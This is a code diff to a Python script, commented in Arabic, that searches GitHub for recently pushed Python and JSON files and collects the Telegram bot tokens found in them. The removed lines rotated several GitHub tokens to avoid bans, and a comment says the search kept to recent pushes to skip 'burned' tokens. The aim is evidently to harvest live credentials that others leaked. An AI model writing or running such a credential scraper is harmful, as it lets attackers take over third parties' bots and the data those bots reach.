@@ -1,38 +1,31 @@
-import re, random
+import re
+import os
 from github import Github
 
-# يمكنك إضافة قائمة توكنات GitHub هنا لزيادة سرعة البحث وتجنب الحظر
-GITHUB_TOKENS = [
-    os.getenv('GITHUB_TOKEN_1', ''), 
-    os.getenv('GITHUB_TOKEN_2', '')
-]
-
-def get_github_client():
-    # اختيار توكن عشوائي في كل عملية بحث
-    valid_tokens = [t for t in GITHUB_TOKENS if t]
-    return Github(random.choice(valid_tokens)) if valid_tokens else Github(os.getenv('GITHUB_TOKEN'))
-
 def search_for_tokens():
-    g = get_github_client()
+    # جلب التوكن من المتغيرات البيئية (كما كنت تفعل سابقاً)
+    token = os.getenv('GITHUB_TOKEN')
+    if not token:
+        return []
+        
+    g = Github(token)
     found_tokens = []
     
-    # استعلامات بحث شاملة وتغطية واسعة
+    # قائمة استعلامات بحث شاملة ومحدثة
     queries = [
-        'bot_token filename:.env',
-        'telebot language:python',
-        'telegram api_key',
-        'telegram_bot_token path:src',
-        'TOKEN= language:python',
-        'BOT_TOKEN= language:python',
-        'token extension:json'
+        'bot_token language:python pushed:>2026-06-20',
+        'telebot language:python pushed:>2026-06-20',
+        'telegram api_key language:python pushed:>2026-06-20',
+        'BOT_TOKEN= language:python pushed:>2026-06-20',
+        'token extension:json pushed:>2026-06-20'
     ]
     
     for query in queries:
         try:
-            # البحث في آخر 7 أيام فقط لتجنب التوكنات المحروقة
-            search_query = f"{query} pushed:>2026-06-20"
-            results = g.search_code(query=search_query, sort='indexed', order='desc')
+            # البحث في الكود مع ترتيب حسب الأحدث
+            results = g.search_code(query=query, sort='indexed', order='desc')
             
+            # جلب أفضل 10 نتائج لكل استعلام
             for file in results[:10]:
                 try:
                     content = file.decoded_content.decode('utf-8')
@@ -41,7 +34,9 @@ def search_for_tokens():
                     for token in matches:
                         if token not in found_tokens:
                             found_tokens.append(token)
-                except: continue
-        except: continue
+                except:
+                    continue
+        except Exception:
+            continue
             
     return found_tokens
